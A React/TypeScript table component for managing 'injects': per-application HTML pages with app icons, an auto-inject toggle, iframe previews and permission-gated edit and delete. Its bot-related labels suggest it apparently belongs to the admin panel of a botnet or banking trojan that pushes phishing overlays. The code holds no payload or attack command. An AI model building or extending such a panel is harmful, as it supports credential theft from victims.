import React from "react";
import {Inject} from "../../../Model/Inject";
import {useTranslation} from "react-i18next";
import {
    CodeOutlined,
    DeleteFilled,
    EditFilled,
    EyeFilled,
    PaperClipOutlined,
    PoweroffOutlined,
    UnorderedListOutlined,
} from "@ant-design/icons";
import {Button, Modal, Space, Switch, Table} from "antd";
import {deleteInjects, setAutoInject} from "../../../Store/Injections/Actions";
import {getBackendUrl} from "../../../Util/config";
import {hasAccess} from "../../../Util/hasAccess";
import {ColumnType} from "antd/es/table/interface";
import {AppState} from "../../../Store/RootReducer";
import {useAppSelector} from "../../../Hook/useAppSelector";
import {useAppDispatch} from "../../../Hook/useAppDispatch";

interface InjectionsProps {
    inject: Inject[],
    paginationHandler: (pageNumber: number, size: number) => void,
    isLoaded: boolean,
    showEditInjectModal: boolean,
    setShowEditInjectModal: (inject: Inject) => void
}

interface InjectsLogsColumns<T> extends ColumnType<T> {
    isHidden?: boolean,
}

const InjectionsTable: React.FC<InjectionsProps> = (props: InjectionsProps) => {
    const {t} = useTranslation();
    const injectionsReducer = useAppSelector((state: AppState) => state.injects);
    const authReducer = useAppSelector((state: AppState) => state.auth);
    const dispatch = useAppDispatch();

    const columns: InjectsLogsColumns<Inject>[] = [
        {
            title: (
                <>
                    <CodeOutlined /> {t("INJ_COLUMN_APP")}
                </>
            ),
            dataIndex: "application",
            key: "application",
            width: 490,
            render: (application: string, inject: Inject) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("INJ_COLUMN_APP")}</h3>
                        </div>
                        <div className="table-col-item">
                            <Space size={10}>
                                <div
                                    className="app-icon"
                                    style={{
                                        backgroundImage: `url(${inject.image})`,
                                    }}
                                />
                                {application}
                            </Space>
                        </div>
                    </div>
                );
            },
        },
        {
            title: (
                <>
                    <CodeOutlined /> {t("INJ_COLUMN_NAME")}
                </>
            ),
            dataIndex: "name",
            key: "name",
            render: (text: string) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("INJ_COLUMN_NAME")}</h3>
                    </div>
                    <div className="table-col-item">
                        {text}
                    </div>
                </div>,

        },
        {
            title: (
                <>
                    <CodeOutlined /> {t("INJ_COLUMN_TYPE")}
                </>
            ),
            dataIndex: "type",
            key: "type",
            render: (text: string) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("INJ_COLUMN_TYPE")}</h3>
                    </div>
                    <div className="table-col-item">
                        {text}
                    </div>
                </div>,
        },
        {
            title: (
                <>
                    <PoweroffOutlined /> {t("INJ_COLUMN_AUTO")}
                </>
            ),
            dataIndex: "auto",
            width: 130,
            key: "auto",
            render: (auto: boolean, inject: Inject) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("INJ_COLUMN_AUTO")}</h3>
                    </div>
                    <div className="table-col-item">
                        <Switch defaultChecked={auto} onChange={(value: boolean) => {
                            dispatch(setAutoInject(inject.id, value));
                        }} />
                    </div>
                </div>
            ),
        },
        {
            title: (
                <>
                    <PaperClipOutlined /> {t("INJ_COLUMN_HTML")}
                </>
            ),
            dataIndex: "html",
            width: 100,
            render: (html: string, inject: Inject) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("INJ_COLUMN_HTML")}</h3>
                    </div>
                    <div className="table-col-item">
                        <Button
                            type="dashed"
                            shape="circle"
                            icon={<EyeFilled />}
                            size="small"
                            onClick={() => {
                                Modal.info({
                                    title: (
                                        <div className="inject-modal-header">
                                            <Space>
                                                <div
                                                    className="app-icon"
                                                    style={{
                                                        backgroundImage: `url(${getBackendUrl(inject.image)})`,
                                                    }}
                                                />

                                                <span>{inject.application}</span>
                                                <span>-</span>
                                                <span>{inject.name}</span>
                                            </Space>
                                        </div>
                                    ),
                                    icon: null,
                                    content: (
                                        <div
                                            style={{
                                                margin: "0 -32px",
                                            }}
                                        >
                                            <iframe
                                                src={getBackendUrl(html) + "?" + Date.now()}
                                                title="Inject title"
                                                frameBorder="0"
                                                width="100%"
                                                height={600}
                                            />
                                        </div>
                                    ),
                                    closable: true,
                                    className: "modal-inject-style",
                                    okText: t("CLOSE"),
                                });
                            }}
                        />
                    </div>
                </div>
            ),
        },
        {
            title: (
                <>
                    <UnorderedListOutlined /> {t("INJ_COLUMN_ACTIONS")}
                </>
            ),
            dataIndex: "actions",
            width: 100,
            render: (actions: string, injection: Inject) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("INJ_COLUMN_ACTIONS")}</h3>
                    </div>
                    <div className="table-col-item">
                        <Space size={10}>
                            {hasAccess(authReducer.user, "injections.edit") && (
                                <Button
                                    type="primary"
                                    shape="circle"
                                    icon={<EditFilled />}
                                    onClick={() => props.setShowEditInjectModal(injection)}
                                />
                            )}
                            {hasAccess(authReducer.user, "injections.delete") && (
                                <Button
                                    type="primary"
                                    shape="circle"
                                    icon={<DeleteFilled />}
                                    danger
                                    onClick={() => {
                                        Modal.confirm({
                                            title: t("INJECT_DELETE"),
                                            content: t("UNDONE_ACTION"),
                                            okText: t("BOT_ACTION_DELETE_CONFIRM"),
                                            cancelText: t("MODAL_BUTTON_CANCEL"),
                                            okButtonProps: {
                                                danger: true,
                                            },
                                            onOk: () => {
                                                dispatch(deleteInjects([injection.id]));
                                            },
                                        });
                                    }}
                                />
                            )}
                        </Space>
                    </div>
                </div>
            ),
            isHidden: !hasAccess(authReducer.user, "injections.edit") && !hasAccess(authReducer.user, "injections.delete"),
        },
    ];

    return (
        <Table
            columns={columns.filter((column: InjectsLogsColumns<Inject>) => !column.isHidden)}
            dataSource={injectionsReducer.injections}
            size="large"
            pagination={{
                total: injectionsReducer.total,
                defaultPageSize: injectionsReducer.per_page,
                onChange: props.paginationHandler,
                showSizeChanger: true,
                current: injectionsReducer.page,
                position: ["topLeft", "bottomLeft"],
                locale: {
                    items_per_page: "",
                },
            }}
            rowKey="id"
            tableLayout="fixed"
            loading={!props.isLoaded}
            locale={{
                emptyText: (
                    <Space>
                        <i className="fa-solid fa-robot" /> {t("TABLE_EMPTY")}
                    </Space>
                ),
            }}
        />
    );
};

export default InjectionsTable;
